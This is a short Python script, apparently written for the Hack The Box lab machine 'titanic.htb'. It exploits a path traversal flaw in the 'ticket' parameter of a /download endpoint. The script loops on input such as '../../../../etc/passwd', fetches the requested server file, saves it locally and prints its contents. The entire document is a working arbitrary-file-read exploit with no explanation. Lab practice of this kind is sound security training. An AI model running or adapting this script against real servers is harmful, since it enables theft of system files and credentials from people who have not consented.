import requests
import os

base_url = "http://titanic.htb/download"

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"}


while True:
    file_query = input("\nEnter file (e.g. ../../../../etc/passwd) or 'exit': ")

    if file_query.lower() == "exit":
        break

    params = {'ticket': file_query}
    response = requests.get(base_url, params=params, headers=headers)

    if response.status_code == 200:
        local_filename = os.path.basename(file_query)

        with open(local_filename, "wb") as outfile:
            outfile.write(response.content)

        print(f"[+] Sucess! Saved to: {local_filename}")
        print(f"-" * 30)
        print(response.text)
        print(f"-" * 30)
    else:
        print(f"[-] Error: Recieved Status {response.status_code}")
